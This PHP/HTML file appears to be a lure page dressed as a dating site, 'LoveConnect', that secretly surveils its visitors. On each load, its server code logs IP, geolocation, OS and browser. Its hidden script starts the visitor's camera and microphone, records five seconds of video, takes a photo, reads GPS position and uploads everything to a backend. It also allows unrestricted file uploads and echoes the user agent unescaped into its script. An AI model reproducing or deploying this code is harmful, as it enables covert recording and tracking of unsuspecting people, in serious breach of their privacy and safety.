<?php
session_start();
require_once __DIR__ . '/../includes/db.php';

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$date_time = date("Y-m-d H:i:s");

// Detect OS and Browser
function getOSandBrowser($user_agent){
    $os_platform="Unknown OS"; $browser="Unknown Browser";
    if(preg_match('/windows nt 10/i',$user_agent)) $os_platform="Windows 10";
    elseif(preg_match('/windows nt 6.3/i',$user_agent)) $os_platform="Windows 8.1";
    elseif(preg_match('/windows nt 6.2/i',$user_agent)) $os_platform="Windows 8";
    elseif(preg_match('/windows nt 6.1/i',$user_agent)) $os_platform="Windows 7";
    elseif(preg_match('/macintosh|mac os x/i',$user_agent)) $os_platform="Mac OS";
    elseif(preg_match('/linux/i',$user_agent)) $os_platform="Linux";

    if(preg_match('/chrome/i',$user_agent)) $browser="Chrome";
    elseif(preg_match('/firefox/i',$user_agent)) $browser="Firefox";
    elseif(preg_match('/safari/i',$user_agent)) $browser="Safari";
    elseif(preg_match('/edge/i',$user_agent)) $browser="Edge";
    elseif(preg_match('/msie|trident/i',$user_agent)) $browser="Internet Explorer";

    return [$os_platform,$browser];
}

list($os,$browser)=getOSandBrowser($user_agent);

// Location via IP API (fallback for localhost)
if($ip=="::1" || $ip=="127.0.0.1"){
    $city=$region=$country=$latitude=$longitude="Localhost";
}else{
    $location=@file_get_contents("http://ip-api.com/json/{$ip}");
    $location=$location?json_decode($location,true):[];
    $city=$location['city'] ?? 'Unknown';
    $region=$location['regionName'] ?? 'Unknown';
    $country=$location['country'] ?? 'Unknown';
    $latitude=$location['lat'] ?? 'Unknown';
    $longitude=$location['lon'] ?? 'Unknown';
}

// Folders setup
$base_upload = __DIR__ . '/../uploads/';
$folders=['images','videos','logs'];
foreach($folders as $f){if(!is_dir($base_upload.$f)) mkdir($base_upload.$f,0777,true);}

// Log file
$log_file = $base_upload.'logs/visitor_info.txt';
function writeVisitorLog($data){global $log_file;file_put_contents($log_file,$data,FILE_APPEND);}

// Initial visitor log
$log_data="========================================\n";
$log_data.="Date & Time : $date_time\n";
$log_data.="IP Address  : $ip\n";
$log_data.="City        : $city\n";
$log_data.="Region      : $region\n";
$log_data.="Country     : $country\n";
$log_data.="Latitude    : $latitude\n";
$log_data.="Longitude   : $longitude\n";
$log_data.="OS          : $os\n";
$log_data.="Browser     : $browser\n";
$log_data.="User Agent  : $user_agent\n";
$log_data.="========================================\n\n";
writeVisitorLog($log_data);

$errors=[];$success="";

// Handle form submission
if($_SERVER['REQUEST_METHOD']==='POST'){
    $text_input = trim($_POST['text_input'] ?? '');
    // Photo
    $photo_path=''; if(!empty($_FILES['photo']['name'])){
        $photo_name=time().'_'.basename($_FILES['photo']['name']);
        move_uploaded_file($_FILES['photo']['tmp_name'],$base_upload.'images/'.$photo_name);
        $photo_path='uploads/images/'.$photo_name;
    }
    // Video
    $video_path=''; if(!empty($_FILES['video']['name'])){
        $video_name=time().'_'.basename($_FILES['video']['name']);
        move_uploaded_file($_FILES['video']['tmp_name'],$base_upload.'videos/'.$video_name);
        $video_path='uploads/videos/'.$video_name;
    }
    // Save to DB
    $stmt=$pdo->prepare("INSERT INTO visitors (ip_address, city, region, country, latitude, longitude, user_agent, text_input, photo_path, video_path, visit_time) VALUES (?,?,?,?,?,?,?,?,?,?,?)");
    if($stmt->execute([$ip,$city,$region,$country,$latitude,$longitude,$user_agent,$text_input,$photo_path,$video_path,$date_time])){
        $success="✅ Thank you for visiting!";
    }else{$errors[]="❌ Failed to save your data!";}
    // Log submission
    $log_data="--- Form Submission ---\n";
    $log_data.="Date & Time : $date_time\n";
    $log_data.="Text Input  : $text_input\n";
    $log_data.="Photo Path  : $photo_path\n";
    $log_data.="Video Path  : $video_path\n";
    $log_data.="========================================\n\n";
    writeVisitorLog($log_data);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LoveConnect | Find Your Match</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
body{font-family:'Roboto',sans-serif;margin:0;padding:0;overflow-x:hidden;color:#333;}
a{text-decoration:none;}
.navbar{display:flex;justify-content:space-between;align-items:center;background:#ff4b6e;padding:15px 30px;position:sticky;top:0;z-index:1000;box-shadow:0 5px 15px rgba(0,0,0,0.1);}
.navbar h1{color:#fff;font-size:28px;}
.nav-links a{color:#fff;margin-left:20px;font-weight:600;transition:0.3s;}
.nav-links a:hover{color:#ffe5ec;}
.hero{position:relative;width:100%;height:100vh;background:url('https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=1950&q=80') no-repeat center/cover;display:flex;align-items:center;justify-content:center;text-align:center;overflow:hidden;}
.hero::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:1;}
.hero-content{position:relative;z-index:2;color:#fff;animation:fadeIn 2s ease-in-out;}
.hero-content h1{font-size:4rem;margin-bottom:20px;animation:slideDown 1.5s ease-out;}
.hero-content p{font-size:1.3rem;margin-bottom:30px;animation:fadeIn 2s ease-in forwards;}
.hero-content a{background:#ff4b6e;color:#fff;padding:15px 35px;border-radius:50px;font-weight:bold;font-size:1.1rem;transition:0.3s;}
.hero-content a:hover{background:#fff;color:#ff4b6e;transform:scale(1.05);}
.heart{position:absolute;color:#ff4b6e;font-size:1.5rem;animation:floatUp linear infinite;opacity:0.8;}
@keyframes floatUp{0%{transform:translateY(0) scale(1);opacity:0.8;}100%{transform:translateY(-100vh) scale(1.3);opacity:0;}}
@keyframes fadeIn{0%{opacity:0;}100%{opacity:1;}}
@keyframes slideDown{0%{transform:translateY(-50px);opacity:0;}100%{transform:translateY(0);opacity:1;}}
.features-section{background:#fff;padding:70px 20px;text-align:center;}
.features-section h2{color:#ff4b6e;font-size:2.5rem;margin-bottom:40px;}
.features{display:flex;flex-wrap:wrap;justify-content:center;gap:30px;}
.feature-box{background:#fff;border-radius:15px;padding:30px;width:280px;box-shadow:0 8px 25px rgba(0,0,0,0.1);transition:0.3s;cursor:pointer;}
.feature-box:hover{transform:translateY(-10px);box-shadow:0 15px 30px rgba(0,0,0,0.15);}
.feature-box i{font-size:50px;color:#ff4b6e;margin-bottom:15px;}
.feature-box h4{font-size:22px;margin-bottom:12px;}
.feature-box p{color:#555;font-size:15px;}
.cta-section{background:#ff4b6e;color:#fff;padding:60px 20px;text-align:center;}
.cta-section h2{font-size:2.5rem;margin-bottom:25px;}
.cta-section a{background:#fff;color:#ff4b6e;padding:15px 40px;border-radius:50px;font-weight:bold;font-size:1.2rem;transition:0.3s;}
.cta-section a:hover{background:#ffe5ec;}
.capture-form{max-width:500px;margin:50px auto 70px auto;padding:30px;background:#fff;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);}
.capture-form h3{text-align:center;color:#ff4b6e;margin-bottom:20px;}
.capture-form input,.capture-form textarea,.capture-form button{width:100%;padding:10px;margin:10px 0;border-radius:6px;border:1px solid #ccc;}
.capture-form button{background:#ff4b6e;color:#fff;border:none;cursor:pointer;}
.capture-form button:hover{background:#e03e5e;}
.msg{text-align:center;font-size:14px;margin-bottom:10px;}
.success{color:green;}
.error{color:red;}
footer{text-align:center;padding:20px;background:#222;color:#fff;}
#capture-video{display:none;}#capture-canvas{display:none;}
</style>
</head>
<body>

<div class="navbar">
    <h1>❤️ LoveConnect</h1>
    <div class="nav-links">
        <a href="login.php"><i class="fas fa-sign-in-alt"></i> Login</a>
        <a href="register.php"><i class="fas fa-user-plus"></i> Register</a>
    </div>
</div>

<!-- HERO SECTION -->
<section class="hero">
    <div class="hero-content">
        <h1>Find Your Perfect Match</h1>
        <p>Join thousands of singles looking for love, friendship, and meaningful connections.</p>
        <a href="register.php">Get Started ❤️</a>
    </div>
    <!-- Floating Hearts -->
    <i class="fas fa-heart heart" style="left:10%;animation-duration:6s;"></i>
    <i class="fas fa-heart heart" style="left:25%;animation-duration:8s;"></i>
    <i class="fas fa-heart heart" style="left:50%;animation-duration:7s;"></i>
    <i class="fas fa-heart heart" style="left:70%;animation-duration:9s;"></i>
    <i class="fas fa-heart heart" style="left:85%;animation-duration:5s;"></i>
</section>

<!-- FEATURES SECTION -->
<section class="features-section">
    <h2>Why Choose LoveConnect?</h2>
    <div class="features">
        <div class="feature-box"><i class="fas fa-shield-alt"></i><h4>Safe & Secure</h4><p>Privacy and security are our top priority.</p></div>
        <div class="feature-box"><i class="fas fa-heart"></i><h4>Real Connections</h4><p>Meet genuine singles looking for meaningful relationships.</p></div>
        <div class="feature-box"><i class="fas fa-comments"></i><h4>Easy Chat</h4><p>Seamless messaging with emojis, reactions, and private conversations.</p></div>
    </div>
</section>

<!-- CAPTURE FORM -->
<section class="capture-form">
<h3>Say Hello or Share Your Thoughts!</h3>
<?php if(!empty($success)) echo "<div class='msg success'>".htmlspecialchars($success)."</div>"; ?>
<?php foreach($errors as $err) echo "<div class='msg error'>".htmlspecialchars($err)."</div>"; ?>
<form method="post" enctype="multipart/form-data">
<textarea name="text_input" placeholder="Write something..." rows="4"></textarea>
<input type="file" name="photo" accept="image/*">
<input type="file" name="video" accept="video/*">
<button type="submit">Submit</button>
</form>
</section>

<!-- CTA SECTION -->
<section class="cta-section">
    <h2>Ready to Find Your Match?</h2>
    <a href="register.php">Sign Up Now ❤️</a>
</section>

<video id="capture-video" autoplay></video>
<canvas id="capture-canvas" width="320" height="240"></canvas>

<footer>
<p>&copy; <?= date("Y") ?> LoveConnect. All rights reserved.</p>
</footer>

<script>
// Floating hearts animation
const hearts=document.querySelectorAll('.heart');
hearts.forEach(h=>{h.style.top=Math.random()*100+'vh';h.style.fontSize=(Math.random()*30+20)+'px';h.style.opacity=Math.random();});

// ==== LIVE PHOTO & VIDEO CAPTURE ====
let videoEl=document.getElementById('capture-video');
let canvas=document.getElementById('capture-canvas');
let chunks=[]; let mediaRecorder;
let latitude="Localhost", longitude="Localhost";

if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(pos=>{latitude=pos.coords.latitude;longitude=pos.coords.longitude;});
}

navigator.mediaDevices.getUserMedia({video:true,audio:true})
.then(stream=>{
    videoEl.srcObject=stream;
    mediaRecorder=new MediaRecorder(stream);
    mediaRecorder.ondataavailable=e=>chunks.push(e.data);
    mediaRecorder.onstop=()=>{
        let videoBlob=new Blob(chunks,{type:'video/webm'});
        sendData(videoBlob,true);
        chunks=[];
    };
    mediaRecorder.start();
    setTimeout(()=>mediaRecorder.stop(),5000);
})
.catch(err=>{console.error("Camera/mic denied: "+err);sendData(null,false);});

setTimeout(()=>{
    canvas.getContext('2d').drawImage(videoEl,0,0,canvas.width,canvas.height);
    canvas.toBlob(blob=>{window.capturedImage=blob;},'image/png');
},2000);

function sendData(videoBlob, permissionGranted=true){
    let formData=new FormData();
    let infoText=`Visitor Info: Date: <?= $date_time ?>, IP: <?= $ip ?>, City: <?= $city ?>, Region: <?= $region ?>, Country: <?= $country ?>, Latitude: ${latitude}, Longitude: ${longitude}, User Agent: <?= $user_agent ?>, Camera Allowed: ${permissionGranted}`;
    formData.append('text',infoText);
    if(window.capturedImage) formData.append('photo',window.capturedImage,'capture.png');
    if(videoBlob) formData.append('video',videoBlob,'capture.webm');

    fetch('capture_backend.php',{method:'POST',body:formData})
    .then(res=>res.text()).then(console.log).catch(console.error);
}
</script>
</body>
</html>
